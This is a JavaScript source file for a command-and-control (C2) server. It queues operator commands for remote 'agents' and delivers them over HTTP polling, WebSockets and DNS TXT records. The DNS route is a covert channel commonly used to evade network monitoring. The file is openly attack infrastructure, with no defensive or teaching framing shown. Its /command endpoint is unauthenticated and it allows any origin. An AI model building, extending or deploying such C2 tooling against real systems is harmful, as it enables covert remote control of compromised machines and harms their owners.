const http = require('http');
const url = require('url');
const { WebSocketServer } = require('ws');
const { EventEmitter } = require('events');
const { DNSProtocol } = require('./dnsprotocol');

class C2Server extends EventEmitter {
  constructor(options = {}) {
    super();
    this.httpPort = options.port || 8443;
    this.dnsPort = options.dnsPort || 5353;
    this.agents = new Map();
    this.commandQueue = new Map();
    this.httpServer = null;
    this.wss = null;
    this.dns = null;
  }

  async start() {
    return new Promise((resolve, reject) => {
      this.httpServer = http.createServer((req, res) => {
        this._handleHTTP(req, res);
      });

      this.wss = new WebSocketServer({ server: this.httpServer });
      this.wss.on('connection', (ws, req) => {
        this._handleWebSocket(ws, req);
      });

      this.httpServer.listen(this.httpPort, () => {
        this._startDNS((err) => {
          if (err) return reject(err);
          resolve();
        });
      });

      this.httpServer.on('error', reject);
    });
  }

  _startDNS(callback) {
    this.dns = new DNSProtocol(this.dnsPort, 'server');
    this.dns.onQuery((parsed, agentId, rawMsg) => {
      if (!agentId) return;

      if (parsed.qtype === 16) {
        const pending = this.getPendingCommands(agentId);
        const answers = [];
        if (pending.length > 0) {
          const cmd = pending[0];
          this.commandQueue.get(agentId).shift();
          answers.push({ name: parsed.qname, type: 'TXT', data: cmd, ttl: 1 });
        }
        this.dns.sendResponse(rawMsg, parsed.rinfo, answers);
      }
    });
    this.dns.start(callback);
  }

  _handleHTTP(req, res) {
    const parsed = url.parse(req.url, true);
    const method = req.method.toUpperCase();

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (method === 'OPTIONS') {
      res.writeHead(204);
      return res.end();
    }

    if (parsed.pathname === '/poll' && method === 'GET') {
      const agentId = parsed.query.id;
      if (!agentId) {
        res.writeHead(400);
        return res.end(JSON.stringify({ error: 'Missing agent id' }));
      }
      this._registerAgentPoll(agentId, 'http');
      const commands = this.getPendingCommands(agentId);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ commands, agentId }));
    }

    if (parsed.pathname === '/command' && method === 'POST') {
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (!data.agent || !data.command) {
            res.writeHead(400);
            return res.end(JSON.stringify({ error: 'Missing agent or command' }));
          }
          this.sendCommand(data.agent, data.command);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'queued', agent: data.agent }));
        } catch (e) {
          res.writeHead(400);
          res.end(JSON.stringify({ error: 'Invalid JSON' }));
        }
      });
      return;
    }

    if (parsed.pathname === '/agents' && method === 'GET') {
      const list = [];
      for (const [id, info] of this.agents) {
        list.push({ id, channels: info.channels, lastSeen: info.lastSeen, connected: info.connected });
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ agents: list }));
    }

    if (parsed.pathname === '/heartbeat' && method === 'POST') {
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (!data.id) {
            res.writeHead(400);
            return res.end(JSON.stringify({ error: 'Missing id' }));
          }
          this._registerAgentPoll(data.id, data.channel || 'http');
          this.emit('heartbeat', data.id, data.channel || 'http');
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'ok' }));
        } catch (e) {
          res.writeHead(400);
          res.end(JSON.stringify({ error: 'Invalid JSON' }));
        }
      });
      return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: 'Not found' }));
  }

  _handleWebSocket(ws, req) {
    const parsedUrl = url.parse(req.url, true);
    let agentId = null;

    ws.on('message', (data) => {
      try {
        const msg = JSON.parse(data.toString());
        if (!agentId && msg.type !== 'register') return;

        if (msg.type === 'register') {
          agentId = msg.id;
          this.registerAgent(agentId, ['ws']);
          this.emit('agent-connected', agentId, 'ws');
          ws.send(JSON.stringify({ type: 'registered', agentId }));
          return;
        }

        if (msg.type === 'heartbeat') {
          if (agentId) {
            this._registerAgentPoll(agentId, 'ws');
          }
          ws.send(JSON.stringify({ type: 'heartbeat-ack' }));
          return;
        }

        if (msg.type === 'poll') {
          if (!agentId) return;
          this._registerAgentPoll(agentId, 'ws');
          const commands = this.getPendingCommands(agentId);
          ws.send(JSON.stringify({ type: 'commands', commands }));
          return;
        }

        if (msg.type === 'result') {
          if (agentId) {
            this.emit('result', agentId, msg.result, msg.channel);
          }
          return;
        }
      } catch (e) {}
    });

    ws.on('close', () => {
      if (agentId) {
        const agent = this.agents.get(agentId);
        if (agent) agent.connected = false;
        this.emit('agent-disconnected', agentId);
      }
    });

    ws.on('error', () => {});
  }

  registerAgent(id, channels) {
    if (!this.agents.has(id)) {
      this.agents.set(id, {
        channels: [],
        lastSeen: Date.now(),
        connected: true
      });
    }
    const agent = this.agents.get(id);
    for (const ch of channels) {
      if (!agent.channels.includes(ch)) {
        agent.channels.push(ch);
      }
    }
    agent.lastSeen = Date.now();
    agent.connected = true;

    if (!this.commandQueue.has(id)) {
      this.commandQueue.set(id, []);
    }
  }

  _registerAgentPoll(id, channel) {
    this.registerAgent(id, [channel]);
    const agent = this.agents.get(id);
    if (agent) {
      agent.lastSeen = Date.now();
      agent.connected = true;
    }
  }

  sendCommand(agentId, command) {
    if (!this.commandQueue.has(agentId)) {
      this.commandQueue.set(agentId, []);
    }
    this.commandQueue.get(agentId).push(command);
    this.emit('command-sent', agentId, command);
  }

  getPendingCommands(agentId) {
    if (!this.commandQueue.has(agentId)) return [];
    return [...this.commandQueue.get(agentId)];
  }

  getAgentStatus(agentId) {
    const agent = this.agents.get(agentId);
    if (!agent) return null;
    return {
      id: agentId,
      channels: agent.channels,
      lastSeen: agent.lastSeen,
      connected: agent.connected,
      pendingCommands: this.commandQueue.get(agentId)?.length || 0
    };
  }

  stop() {
    if (this.wss) this.wss.close();
    if (this.dns) this.dns.stop();
    if (this.httpServer) this.httpServer.close();
  }
}

module.exports = { C2Server };
